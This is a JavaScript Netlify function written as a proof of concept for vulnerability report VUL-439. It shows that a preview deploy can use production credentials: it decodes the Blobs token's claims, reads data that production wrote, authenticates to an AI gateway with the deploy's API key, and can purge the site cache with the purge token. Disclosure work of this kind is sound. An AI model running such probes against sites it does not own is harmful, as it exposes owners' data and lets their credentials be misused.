import { getStore } from '@netlify/blobs'

// VUL-439 runtime-credential probe. Proportionate "does it actually work" tests:
//   - Blobs: read back a key the TRUSTED (production) deploy seeded, proving an
//     untrusted preview reads owner-written production data. Values are our own
//     non-secret markers.
//   - AI: read-only GET /models (an auth check). NO completion -> nothing billed.
//   - Purge: actually purges YOUR cache, so it is gated behind ?confirm=purge
//     and off by default.
// Never prints a token value; only decoded claims (JWT body) and the base URLs.
const decodeClaims = (jwt) => {
  try {
    const [, body] = String(jwt).split('.')
    return JSON.parse(Buffer.from(body, 'base64url').toString())
  } catch {
    return '<not a JWT>'
  }
}

const SEED_KEY = 'vul439/owner-seed'

export default async (req) => {
  const url = new URL(req.url)
  const context = process.env.CONTEXT || null
  const out = { context, deploy_id: process.env.DEPLOY_ID || null }

  // ---- credential claims (presence + scope) ----
  const ctx = process.env.NETLIFY_BLOBS_CONTEXT
  if (ctx) {
    let parsed
    try {
      parsed = JSON.parse(Buffer.from(ctx, 'base64').toString())
    } catch {
      parsed = null
    }
    if (parsed) {
      out.blobs_context = {
        siteID: parsed.siteID,
        deployID: parsed.deployID ?? null,
        token_len: parsed.token?.length ?? 0,
        token_claims: decodeClaims(parsed.token),
      }
    }
  }

  // ---- Blobs: seed from production, read from anywhere (cross-trust read) ----
  try {
    const store = getStore('vul439-canary')
    if (context === 'production') {
      await store.set(SEED_KEY, `written-by-production-${process.env.DEPLOY_ID || 'unknown'}`)
      out.blobs_seeded = true
    }
    // From a preview, a non-null value here = reading data a TRUSTED deploy wrote.
    out.blobs_owner_seed_read = await store.get(SEED_KEY)
  } catch (err) {
    out.blobs_error = err.message
  }

  // ---- AI gateway: read-only models list (auth check, no completion) ----
  const aiBase = process.env.OPENAI_BASE_URL || null
  const aiKey = process.env.OPENAI_API_KEY
  out.ai_base_url = aiBase
  if (aiBase && aiKey) {
    const tryModels = async (u) => {
      try {
        const r = await fetch(u, { headers: { Authorization: `Bearer ${aiKey}` } })
        let count = null
        try {
          const j = await r.clone().json()
          count = Array.isArray(j?.data) ? j.data.length : null
        } catch {}
        return { url: u, status: r.status, model_count: count }
      } catch (err) {
        return { url: u, error: err.message }
      }
    }
    const base = aiBase.replace(/\/$/, '')
    out.ai_models = await tryModels(`${base}/models`)
    if (out.ai_models.status === 404) {
      out.ai_models_v1 = await tryModels(`${base}/v1/models`)
    }
  }

  // ---- Purge: actually purges YOUR cache. Off unless explicitly confirmed. ----
  if (url.searchParams.get('confirm') === 'purge') {
    const token = process.env.NETLIFY_PURGE_API_TOKEN
    try {
      const r = await fetch('https://api.netlify.com/api/v1/purge', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf8', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ site_id: process.env.SITE_ID }),
      })
      out.purge = { status: r.status }
    } catch (err) {
      out.purge = { error: err.message }
    }
  } else {
    out.purge = 'skipped (append ?confirm=purge to purge YOUR OWN cache)'
  }

  return Response.json(out)
}
